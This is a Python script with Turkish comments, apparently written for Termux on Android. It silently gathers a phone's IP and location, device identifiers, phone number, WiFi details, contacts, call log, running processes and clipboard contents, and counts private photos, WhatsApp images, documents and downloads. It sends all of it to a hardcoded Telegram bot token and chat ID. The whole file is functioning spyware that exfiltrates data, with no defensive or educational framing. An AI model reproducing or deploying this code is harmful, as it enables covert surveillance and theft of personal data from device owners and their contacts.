import requests
import os
import platform
import uuid
import subprocess
import json
import glob
import shutil

# 📢 Telegram Bot Bilgileri
BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
CHAT_ID = "7561737990"

# 📡 IP ve cihaz bilgileri
try:
    ip_response = requests.get("http://ip-api.com/json/", timeout=5)
    ip_data = ip_response.json()
    ip_address = ip_data.get("query", "Bilinmiyor")
    country = ip_data.get("country", "Bilinmiyor")
    city = ip_data.get("city", "Bilinmiyor")
except:
    ip_address, country, city = "Bağlantı hatası", "Bağlantı hatası", "Bağlantı hatası"

device_name = platform.node()
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])

# 📞 Telefon numarası alma
try:
    phone_number = subprocess.check_output(["termux-telephony-call"], stderr=subprocess.DEVNULL).decode().strip()
    if not phone_number:
        phone_number = "Erişim engellendi"
except:
    phone_number = "Desteklenmiyor"

# 📱 Telefon modeli alma
try:
    phone_model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
except:
    phone_model = "Bilinmiyor"

# 🔋 Batarya bilgisi
try:
    battery_info = subprocess.check_output(["termux-battery-status"]).decode()
    battery_data = json.loads(battery_info)
    battery_level = f"{battery_data.get('percentage', 'Bilinmiyor')}%"
    battery_status = battery_data.get("status", "Bilinmiyor")
except:
    battery_level = "Bilinmiyor"
    battery_status = "Bilinmiyor"

# 📶 WiFi bilgisi
try:
    wifi_info = subprocess.check_output(["termux-wifi-connectioninfo"]).decode()
    wifi_data = json.loads(wifi_info)
    wifi_ssid = wifi_data.get("ssid", "Bilinmiyor")
    wifi_bssid = wifi_data.get("bssid", "Bilinmiyor")
except:
    wifi_ssid = "Bilinmiyor"
    wifi_bssid = "Bilinmiyor"

# 💾 Depolama bilgisi
total, used, free = shutil.disk_usage("/")
storage_info = f"💾 Toplam: {total // (2**30)} GB / Kullanılan: {used // (2**30)} GB / Boş: {free // (2**30)} GB"

# 📂 WhatsApp & DCIM klasöründen resimleri alma (storage/emulated dahil)
image_paths = glob.glob("/sdcard/DCIM/**/*.jpg", recursive=True) + glob.glob("/sdcard/DCIM/**/*.png", recursive=True)
image_paths += glob.glob("/sdcard/WhatsApp/**/*.jpg", recursive=True) + glob.glob("/sdcard/WhatsApp/**/*.png", recursive=True)
image_paths += glob.glob("/storage/emulated/0/DCIM/**/*.jpg", recursive=True) + glob.glob("/storage/emulated/0/DCIM/**/*.png", recursive=True)

# 📖 Rehberdeki kişileri çekme
try:
    contacts_json = subprocess.check_output(["termux-contact-list"]).decode()
    contacts = json.loads(contacts_json)
    contact_list = "\n".join([f"{c.get('name', 'Bilinmiyor')} - {c.get('number', 'Bilinmiyor')}" for c in contacts[:10]])  # İlk 10 kişi
except:
    contact_list = "Erişim engellendi"

# 📜 Son arama kayıtlarını alma
try:
    call_logs = subprocess.check_output(["termux-call-log"]).decode()
    call_data = json.loads(call_logs)
    call_list = "\n".join([f"{c.get('name', 'Bilinmiyor')} - {c.get('type', 'Bilinmiyor')} ({c.get('duration', '0')}sn)" for c in call_data[:5]])  # Son 5 kayıt
except:
    call_list = "Erişim engellendi"

# 📋 Çalışan uygulamaları listeleme
try:
    running_apps = subprocess.check_output(["ps"]).decode().split("\n")[1:10]  # İlk 10 işlem
    app_list = "\n".join(running_apps)
except:
    app_list = "Bilgi alınamadı"

# 📁 Belgeler, ekran görüntüleri, indirmeler
docs = glob.glob("/storage/emulated/0/Documents/**/*.pdf", recursive=True)
screenshots = glob.glob("/storage/emulated/0/Pictures/Screenshots/**/*.png", recursive=True)
downloads = glob.glob("/storage/emulated/0/Download/**/*.*", recursive=True)

# 📜 Panodaki (clipboard) veriyi çekme
try:
    clipboard_text = subprocess.check_output(["termux-clipboard-get"]).decode().strip()
except:
    clipboard_text = "Erişim yok"

# 📩 Telegram’a gönderme
message = f"""
📡 **Bilgiler**
🌍 IP: {ip_address}
🇹🇷 Ülke: {country}
🏙️ Şehir: {city}
💻 Cihaz Adı: {device_name}
📡 MAC Adresi: {mac_address}

📞 Telefon Numarası: {phone_number}
📱 Telefon Modeli: {phone_model}
🔋 Batarya: {battery_level} ({battery_status})
📶 WiFi: {wifi_ssid} ({wifi_bssid})
💾 Depolama: {storage_info}

📂 WhatsApp & DCIM Resim Sayısı: {len(image_paths)}
📖 Rehber (İlk 10 Kişi):
{contact_list}

📜 Son Arama Kayıtları:
{call_list}

📋 Çalışan Uygulamalar:
{app_list}

📁 Dosya Sayısı:
📑 Belgeler: {len(docs)}
📸 Ekran Görüntüleri: {len(screenshots)}
📥 İndirmeler: {len(downloads)}

📜 Panodaki Veri:
{clipboard_text}
"""

requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": message})

print("✅ Bilgiler Telegram'a gönderildi.")
